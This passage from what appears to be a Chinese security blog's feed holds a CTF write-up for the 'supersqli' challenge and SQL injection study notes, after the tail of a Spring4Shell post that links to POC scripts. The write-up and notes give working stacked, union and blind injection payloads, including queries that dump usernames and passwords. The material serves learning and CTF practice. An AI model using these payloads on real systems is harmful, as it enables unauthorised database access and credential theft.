alt="img"></p><p>这里我做了一个实验，提高了tomcat的版本，结果果然是做不通了，证实了作者的观点。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220408214635468.png" alt="image-20220408214635468"></p><h2 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06 参考文献"></a>0x06 参考文献</h2><p>主要参考：<a href="https://www.aqniu.com/industry/82365.html">https://www.aqniu.com/industry/82365.html</a></p><p>poc脚本参考：</p><p><a href="https://github.com/reznok/Spring4Shell-POC">https://github.com/reznok/Spring4Shell-POC</a></p><p><a href="https://github.com/TheGejr/SpringShell">https://github.com/TheGejr/SpringShell</a></p><p><a href="https://github.com/BobTheShoplifter/Spring4Shell-POC">https://github.com/BobTheShoplifter/Spring4Shell-POC</a></p><p>漏洞信息：</p><p><a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement">https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965">https://nvd.nist.gov/vuln/detail/CVE-2022-22965</a></p><p>基本情况分析参考：</p><p><a href="https://unit42.paloaltonetworks.jp/cve-2022-22965-springshell/">https://unit42.paloaltonetworks.jp/cve-2022-22965-springshell/</a></p><p>其他知识参考：</p><ul><li>Tomcat access_log配置参考文档：<a href="https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging">https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging</a></li><li>Spring 5.3.17和5.3.18版本比较：<a href="https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18">https://github.com/spring-projects/spring-framework/compare/v5.3.17…v5.3.18</a></li><li>Spring 5.3.18补丁提交内容：<a href="https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15">https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15</a></li><li>Tomcat 9.0.61和9.0.62版本比较：<a href="https://github.com/apache/tomcat/compare/9.0.61...9.0.62">https://github.com/apache/tomcat/compare/9.0.61…9.0.62</a></li><li>Tomcat 9.0.62补丁提交内容：<a href="https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c">https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c</a></li><li>LaunchedURLClassLoader源码：<a href="https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java">https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界supersqli_writeup</title>
      <link href="/2022/04/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csupersqli_writeup/"/>
      <url>/2022/04/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csupersqli_writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界supersqli-writeup"><a href="#攻防世界supersqli-writeup" class="headerlink" title="攻防世界supersqli_writeup"></a>攻防世界supersqli_writeup</h1><p>web这进阶区也不简单啊，为什么有那么多人做出来了…</p><p>参考：<a href="https://www.cnblogs.com/hugboy/p/13477856.html">https://www.cnblogs.com/hugboy/p/13477856.html</a></p><h2 id="0x01-判断漏洞存在"><a href="#0x01-判断漏洞存在" class="headerlink" title="0x01 判断漏洞存在"></a>0x01 判断漏洞存在</h2><p>首先，做一个引号闭合，看他用的是单引号还是双引号：</p><p>输入<code>1&#39;</code>和<code>1&quot;</code>,发现前者报错：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415130315219.png" alt="image-20220415130315219"></p><p>那么我们就知道用单引号闭合了，那我们可以先看看这个表里面有什么东西<code>1&#39; or 1=1;#</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415161300747.png" alt="image-20220415161300747"></p><p>表里面有三行，那估计我们要的值实是在其他表里了。</p><h2 id="0x02-查看数据库和表的情况"><a href="#0x02-查看数据库和表的情况" class="headerlink" title="0x02 查看数据库和表的情况"></a>0x02 查看数据库和表的情况</h2><p><code>1&#39;;show tables;#</code>查询所有的表：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415162421750.png" alt="image-20220415162421750"></p><p>也就是说，我们这个数据库中有两个表，这时候我们可以查看一下表中的内容：</p><p><code>1&#39;;show columns from words;#</code></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415170733691.png" alt="image-20220415170733691"></p><p>可以看到words就是我们当前使用的表格，然后再看另一个表：</p><p><code>1&#39;;show columns from 1919810931114514;#</code></p><p>通过上面这个命令执行发现没有显示，这是因为纯数字的话需要添加反引号包裹：</p><p>1’;show columns from `1919810931114514`;#</p><p>用上述shellcode查询后：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415171124167.png" alt="image-20220415171124167"></p><p>可以看到，这个就应该是我们需要的字段！</p><h2 id="0x03-绕过限制"><a href="#0x03-绕过限制" class="headerlink" title="0x03 绕过限制"></a>0x03 绕过限制</h2><p>我们直接查1919810931114514表中的内容试试：<strong>1’; select * from `1919810931114514`;#</strong></p><p>发现不行，做了过滤，以下关键词都不让用，改变大小写也无效：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415171744894.png" alt="image-20220415171744894"></p><p>这时候，就存在多种解决方案了，首先先上官方做法：</p><h3 id="一、改表名法"><a href="#一、改表名法" class="headerlink" title="一、改表名法"></a>一、改表名法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;  <span class="keyword">alter</span> <span class="keyword">table</span>s words rename <span class="keyword">to</span> words1; #</span><br><span class="line">;  <span class="keyword">alter</span> <span class="keyword">table</span>s `<span class="number">1919810931114514</span>` rename <span class="keyword">to</span> words ;#</span><br></pre></td></tr></table></figure><p>这样就把我们的1919810931114514的表明改为了word，由于系统默认查询的是words，因此此时只需要：</p><p><code>1&#39; or 1=1 #</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415172800938.png" alt="image-20220415172800938"></p><p>结果发现出了点小问题，怎么回事？原来是因为默认查找的words表中必须有id字段，那我们再加一条：</p><p><code>;  alter tables words change flag id varchar(50); #</code></p><p>但是这里已经闭合不上了，重新起一遍环境：</p><p>直接三句话合成一句一波搞定：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span></span><br></pre></td></tr></table></figure><p>改完查一查到底改了没：</p><p><strong>1’;show tables;</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415173248799.png" alt="image-20220415173248799"></p><p>可以的，我们此时就可以直接查询原1919810931114514的所有项了：<strong>1’ or 1=1;#</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415173332616.png" alt="image-20220415173332616"></p><p>好，搞定了，因为懒得改回去，所以我们重新再起一遍环境，开启下一种解法。</p><h3 id="二、预编译法"><a href="#二、预编译法" class="headerlink" title="二、预编译法"></a>二、预编译法</h3><p>参考：<a href="https://www.cnblogs.com/micrari/p/7112781.html">https://www.cnblogs.com/micrari/p/7112781.html</a></p><blockquote><p>通常我们的一条sql在db接收到最终执行完毕返回可以分为下面三个过程：</p><ol><li>词法和语义解析</li><li>优化sql语句，制定执行计划</li><li>执行并返回结果</li></ol><p>我们把这种普通语句称作<strong>Immediate Statements</strong>。</p><p>但是很多情况，我们的一条sql语句可能会反复执行，或者每次执行的时候只有个别的值不同（比如query的where子句值不同，update的set子句值不同,insert的values值不同）。<br>如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。</p><p>所谓预编译语句就是将这类语句中的值用占位符替代，可以视为将sql语句模板化或者说参数化，一般称这类语句叫<strong>Prepared Statements</strong>或者<strong>Parameterized Statements</strong><br>预编译语句的优势在于归纳为：<strong>一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止sql注入。</strong><br>当然就优化来说，很多时候最优的执行计划不是光靠知道sql语句的模板就能决定了，往往就是需要通过具体值来预估出成本代价。</p></blockquote><p>首先呢，我们用sql定义一个字符串变量，在其中使用concat绕过内容限制；<br>然后使用<code>set</code>命令对这个变量中的内容进行预编译<br>最后使用<code>excute</code>命令直接执行该语句；</p><p><strong>编译</strong></p><p>set @sql = concat(‘sele’,’ct * from `1919810931114514`;’);</p><p>prepare stm from @sql;</p><p><strong>执行</strong></p><p>execute stm;–+</p><p><strong>最终构造语句：</strong></p><p>set @sql = concat(‘sele’,’ct * from <code>1919810931114514</code>;’);prepare stm from @sql;execute stm;#</p><p>执行以下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415175526561.png" alt="image-20220415175526561"></p><p>发现竟然不行。。。仔细观察返回内容，可以看到使用限制的函数是strstr，有点搞笑，直接大写绕过：</p><p><strong>1’;sEt @sql = concat(‘sele’,’ct * from <code>1919810931114514</code>;’);prEpare smt from @sql;execute smt;#</strong></p><p>成功了！</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415180112959.png" alt="image-20220415180112959"></p><p>strstr的使用比较愚蠢，如果使用对于大小写不敏感的*strstrw()*，或许会更难使用这种方法吧~</p><h3 id="三、使用handler执行"><a href="#三、使用handler执行" class="headerlink" title="三、使用handler执行"></a>三、使用handler执行</h3><p>handler介绍参考：<a href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p><p>注入教程参考：<a href="https://blog.csdn.net/nicesa/article/details/106390405">https://blog.csdn.net/nicesa/article/details/106390405</a></p><blockquote><p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p></blockquote><p>使用方法：</p><p>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行<br>最后一行执行之后再执行handel table_name read next会返回一个空的结果</p><p><strong>1’;handler `1919810931114514` open;handler `1919810931114514` read first;#</strong></p><p>直接使用这句话：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415181115643.png" alt="image-20220415181115643"></p><p>牛，确实还是这个最快，改名字属实是奇葩思路。。.</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入笔记@Biscuit19</title>
      <link href="/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入笔记"><a href="#sql注入笔记" class="headerlink" title="sql注入笔记"></a>sql注入笔记</h1><p>​    被迫转web了，总结一下sql注入吧，笔记源于@**Biscuit19_**；</p><h2 id="0x01-sql基础"><a href="#0x01-sql基础" class="headerlink" title="0x01 sql基础"></a>0x01 sql基础</h2><h3 id="一、插入更新删除"><a href="#一、插入更新删除" class="headerlink" title="一、插入更新删除"></a>一、插入更新删除</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (column_name column_type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_name (column1,column2,column3,...) <span class="keyword">values</span> (value1,value2,value3,...);</span><br><span class="line"></span><br><span class="line">update tb_name <span class="keyword">set</span> 字段<span class="number">1</span> <span class="operator">=</span> 新值,字段<span class="number">2</span> <span class="operator">=</span> 新值,  <span class="keyword">where</span> 字段 <span class="operator">=</span> 某值；</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tb_name <span class="keyword">where</span> 列名称 <span class="operator">=</span> 某值；</span><br></pre></td></tr></table></figure><h3 id="二、常用到的通用字段"><a href="#二、常用到的通用字段" class="headerlink" title="二、常用到的通用字段"></a>二、常用到的通用字段</h3><p><strong>information_schema</strong>是整个数据库</p><p>information_schema里的表：</p><ul><li><strong>information_schema.schemata</strong>为所有数据库信息，包含：<ul><li>其中的字段：</li><li><strong>schema_name</strong>: 所有数据库名</li></ul></li><li><strong>information_schema.tables</strong>为所有表的信息，包含：<ul><li>其中的字段：</li><li><strong>table_schema</strong>: 表所在的数据库名</li><li><strong>table_rows</strong>表的行数（有多少条数据）</li><li><strong>table_name</strong> 记录数据表名</li></ul></li><li><strong>information_schema.columns</strong>为所有字段的信息，包含：<ul><li>其中的字段： </li><li><strong>column_name</strong>字段名</li><li><strong>table_name</strong>   字段所在的表名（用于条件查询）</li><li><strong>table_schema</strong> 字段所在数据库名（用于条件查询）</li><li><strong>column_type</strong> 字段类型</li></ul></li></ul><h3 id="三、常用语法："><a href="#三、常用语法：" class="headerlink" title="三、常用语法："></a>三、常用语法：</h3><h4 id="1-基础"><a href="#1-基础" class="headerlink" title="1.基础"></a>1.基础</h4><p>在最基础的查询语句中，我们直接使用如下语法进行查询，并使用where作为条件限制：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> field1,field2,...fieldn... <span class="keyword">from</span> 表名 [<span class="keyword">where</span> 条件];</span><br></pre></td></tr></table></figure><h4 id="2-Order-by"><a href="#2-Order-by" class="headerlink" title="2.Order by"></a>2.Order by</h4><h5 id="order-by-字段名（列名"><a href="#order-by-字段名（列名" class="headerlink" title="order by 字段名（列名"></a>order by 字段名（列名</h5><p>进一步的，我们为了更好的排序输出结果，可以用orderby来控制结果的排序（asc为顺序，desc为逆序）：</p><p>select * from 表名 [where 条件] [ order by  field1 [desc/asc],field2 [desc/asc]… ];</p><p>举个例子：</p><p>​    以逆字母顺序显示公司名称，并以数字顺序显示顺序号：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company <span class="keyword">DESC</span>, OrderNumber <span class="keyword">ASC</span></span><br></pre></td></tr></table></figure><h5 id="order-by-数字"><a href="#order-by-数字" class="headerlink" title="order by 数字"></a>order by 数字</h5><p>含义：order by+列名 就是按某一列的排序进行查找,默认升序, 加数字就是第几列的意思，如下</p><p>sql语句中order by 1或者order by 2…order by N</p><p>其实1表示第一个字段,2表示第二个字段; </p><p>依此类推,当表中只有2个栏位时,order by 3就会出错, 所以就说明列表只有2个字段, 是用来报字段名的</p><h4 id="3-limit"><a href="#3-limit" class="headerlink" title="3.limit"></a>3.limit</h4><p>**!!!从0开始!!! **</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> LIMIT [<span class="keyword">offset</span>,] <span class="keyword">rows</span> <span class="operator">|</span> <span class="keyword">rows</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span></span><br></pre></td></tr></table></figure><p>第一个参数指定从第几行开始查，第二个参数指定要查几行。<strong>初始记录行的偏移量是 0(而不是 1)</strong></p><p>举个例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> table1 LIMIT <span class="number">5</span>,<span class="number">10</span>; # 检索记录行 <span class="number">6</span><span class="number">-15</span>\<span class="operator">*</span></span><br><span class="line"><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> table1 LIMIT <span class="number">5</span>; #检索前 <span class="number">5</span> 个记录行\<span class="operator">*</span>（<span class="number">0</span><span class="number">-4</span>）</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1 limit n<span class="number">-1</span>,<span class="number">1</span>; #查询第n行</span><br><span class="line"><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> table1 LIMIT <span class="number">95</span>,<span class="number">-1</span>; #检索记录行 <span class="number">96</span><span class="operator">-</span>last.\<span class="operator">*</span></span><br></pre></td></tr></table></figure><h4 id="4-UNION-联合查询"><a href="#4-UNION-联合查询" class="headerlink" title="4.UNION(联合查询)"></a>4.UNION(联合查询)</h4><ul><li>UNION必须由两条或两条以上的SELECT语句组成，语句之间用关键字UNION分隔</li><li>UNION中的每个查询必须包含相同的列，然后会将这两个结果通过这个相同的列链接起来。</li><li>UNION会从查询结果集中自动去除了重复行，UNION ALL不会。</li></ul><h4 id="5-concat-ws-函数"><a href="#5-concat-ws-函数" class="headerlink" title="5.concat_ws()函数"></a>5.concat_ws()函数</h4><p>简单的说，就是一个字符串连接函数：</p><ol><li><p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符;（concat_ws就是concat with separator）</p></li><li><p>语法：concat_ws(separator, str1, str2, …)</p></li></ol><p>举个例子</p><p>SELECT CONCAT_WS(‘,’,’First name’,NULL,’Last Name’);返回结果为<br>+———————————————-+<br>| CONCAT_WS(‘,’,’First name’,NULL,’Last Name’) |<br>+———————————————-+<br>| First name,Last Name             |#可以看到通过逗号分隔了<br>+———————————————-+e</p><p>**concat()**和它一样，只不过是少了分隔符，就是单纯的多个字符串连接成一个字符串</p><h4 id="6-group-concat（-concat-ws）"><a href="#6-group-concat（-concat-ws）" class="headerlink" title="6.group_concat（+concat_ws）"></a>6.group_concat（+concat_ws）</h4><ol><li><p>功能：把查询到的很多行合成一行来写</p></li><li><p>语法：group_concat( [distinct] str1,str2… [order by 排序字段 asc/desc ] [separator ‘分隔符’] ):</p></li></ol><p>默认就是以 ，为分隔符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> (GROUP_CONCAT(mk_username,mk_password)) <span class="keyword">FROM</span> demouser.mk_users </span><br><span class="line">得到:</span><br><span class="line">test5111111,test6111111,test7111111</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> (GROUP_CONCAT(concat_ws(<span class="string">&#x27;,&#x27;</span>,mk_username,mk_password))) <span class="keyword">FROM</span> demouser.mk_users </span><br><span class="line">得到：</span><br><span class="line">test5,<span class="number">111111</span>,test6,<span class="number">111111</span>,<span class="number">11111</span>,<span class="number">1111111111</span>,test7,<span class="number">1111111</span></span><br></pre></td></tr></table></figure><h2 id="0x02-常用语句"><a href="#0x02-常用语句" class="headerlink" title="0x02 常用语句"></a>0x02 常用语句</h2><h3 id="一、爆数据库信息常用语句"><a href="#一、爆数据库信息常用语句" class="headerlink" title="一、爆数据库信息常用语句"></a>一、爆数据库信息常用语句</h3><h4 id="1-用户数据库版本，管理员用户名及数据库名字"><a href="#1-用户数据库版本，管理员用户名及数据库名字" class="headerlink" title="1.用户数据库版本，管理员用户名及数据库名字"></a>1.用户数据库版本，管理员用户名及数据库名字</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),<span class="keyword">user</span>(),<span class="number">5</span>,database()</span><br></pre></td></tr></table></figure><h4 id="2-爆所有数据库名："><a href="#2-爆所有数据库名：" class="headerlink" title="2.爆所有数据库名："></a>2.爆所有数据库名：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h4 id="3-爆某数据库中的所有表名："><a href="#3-爆某数据库中的所有表名：" class="headerlink" title="3.爆某数据库中的所有表名："></a>3.爆某数据库中的所有表名：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</strong><br>类似TABLE_SCHEMA=0x674657374</p><h4 id="4-爆某数据库中某表的所有字段名："><a href="#4-爆某数据库中某表的所有字段名：" class="headerlink" title="4.爆某数据库中某表的所有字段名："></a>4.爆某数据库中某表的所有字段名：</h4><p>select group_concat(COLUMN_NAME) from information_schema.COLUMNS where<br>TABLE_SCHEMA=’数据库名’and TABLE_NAME=’表名’</p><h4 id="5-爆某表中的所有信息，用逗号分隔"><a href="#5-爆某表中的所有信息，用逗号分隔" class="headerlink" title="5.爆某表中的所有信息，用逗号分隔"></a>5.爆某表中的所有信息，用逗号分隔</h4><p>select GROUP_CONCAT(concat_ws(‘,’,st1,st2…)) FROM 数据库名.表名</p><p>、</p><h2 id="0x03-常见注入类型"><a href="#0x03-常见注入类型" class="headerlink" title="0x03 常见注入类型"></a>0x03 常见注入类型</h2><h3 id="一、字符型注入-判断引号闭合"><a href="#一、字符型注入-判断引号闭合" class="headerlink" title="一、字符型注入,判断引号闭合:"></a>一、字符型注入,判断引号闭合:</h3><p>‘ or ‘1’=’1</p><p>“ or “1”=”1</p><p>原理:</p><p><strong>select * from mk_users where mk_username=’Biscuit19_’ and mk_password=’’ or ‘1’=’1’</strong></p><h3 id="二、注释型注入"><a href="#二、注释型注入" class="headerlink" title="二、注释型注入"></a>二、注释型注入</h3><p>‘or 1=1 #</p><p><strong>select * from mk_users where mk_username=’Biscuit19_’ and mk_password=’’ or 1=1 #’</strong></p><p>Biscuit19_’ or 1=1 #</p><p><strong>select * from mk_users where mk_username=’Biscuit19_’ or 1=1 #’ and mk_password=’123334’</strong></p><p><strong>没有显示位</strong></p><h3 id="三、union注入"><a href="#三、union注入" class="headerlink" title="三、union注入"></a>三、union注入</h3><p>{“userName”:”Biscuit19_”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select 1,2,3,4 #”,”userType”:”USER”,”filePath”:””}</p><p> <strong>用来合并两个或多个 SELECT 语句的结果集</strong></p><p>select <strong>dir_name</strong> as FileName,<strong>dir_type</strong> as FileType,<strong>update_time</strong> as<br>    RecentEditTime,<strong>creator_name</strong> as Creater from file_dir where creator_name=’Biscuit19_’ <strong>union select 1,2,3,4</strong> #’</p><p>多了一个元组</p><p>{“userName”:”Biscuit19_’ union select database(),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select  group_concat(table_name) from information_schema.tables where table_schema=’数据库名’),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select  group_concat(table_name) from information_schema.tables where table_schema=’demouser’),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=’demouser’and TABLE_NAME=’mk_users’),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select GROUP_CONCAT(concat_ws(‘,’,mk_id,mk_username,mk_password,mk_email,mk_enabled,create_time,update_time)) FROM demouser.mk_users),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><h3 id="四、布尔盲注"><a href="#四、布尔盲注" class="headerlink" title="四、布尔盲注"></a>四、布尔盲注</h3><p>页面在执行sql语句后，只会显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。</p><p>注意：布尔盲注是逻辑运算而不是输出值，所以and后面接的是逻辑表达式；还有，必须select出来结果才能比较</p><p>1=1 是没有结果的</p><p>SELECT 1=1 才有结果，结果是1（true），这里指的是函数（）需要select 出来比较，而不是说1=1就没有结果，1=1的结果就是true，这句话的意思就是这种函数得到的值要select出来才可以</p><p>(select length(database())=3)</p><h4 id="1-所用函数"><a href="#1-所用函数" class="headerlink" title="1.所用函数"></a>1.所用函数</h4><h5 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h5><p>函数可返回字符串的长度，用于碰撞出数据库名字的长度。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">length</span>(<span class="params">database(</span>))</span>;</span><br></pre></td></tr></table></figure><h5 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h5><p>substring()函数可以截取字符串，可指定开始的位置和截取的长度，用于进一步剪切。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params"><span class="string">&#x27;test&#x27;</span>,<span class="number">1</span>,<span class="number">3</span></span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params"><span class="string">&#x27;test&#x27;</span>,<span class="number">2</span>,<span class="number">1</span></span>)</span>;</span><br></pre></td></tr></table></figure><p>substring的第一位是1，不是0，所以至少从1开始</p><h5 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h5><p>ord()函数可以返回单个字符的ASCII码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params">database(</span>),1,1)</span>;</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">ord</span>(<span class="params">substring(database(</span>),1,1))</span>;</span><br></pre></td></tr></table></figure><p>因此，通过(select ord(substring(database(),1,1))=31)这样的语句反复碰撞，就能得到数据库名！</p><p>即只需要和这些字符的ASCII值进行比较：</p><p>0-9：48-57          _：95<br>A-Z：65-91         a-z：97-122</p><p>全查：33-126</p><h4 id="2-手工注入"><a href="#2-手工注入" class="headerlink" title="2 手工注入"></a>2 手工注入</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>因为<strong>sql执行失败和未查到数据都会返回False</strong>，所以只能通过返回的逻辑值来判断，如果有类似如下这种情况，则存在布尔盲注</p><p>也可以通过sleep(3)来试试，看看会不会停止3s，如果停止了，说明后面的语句也执行了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 整型注入 */</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1 <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="literal">true</span> </span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1 <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> flase</span><br><span class="line"><span class="comment">/* 字符型注入 */</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br><span class="line"><span class="comment">/* 字符型注入 */</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1&quot; and &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1&quot; and &quot;<span class="number">1</span>&quot;=&quot;<span class="number">2</span></span><br></pre></td></tr></table></figure><p>注意！当你连一个正确的参数都没有的时候，你要直接闭合然后把and改成or来判断，此时前一个条件为false，用or后面来决定对错，where username=’’ or 1=1 /1=2 如:</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 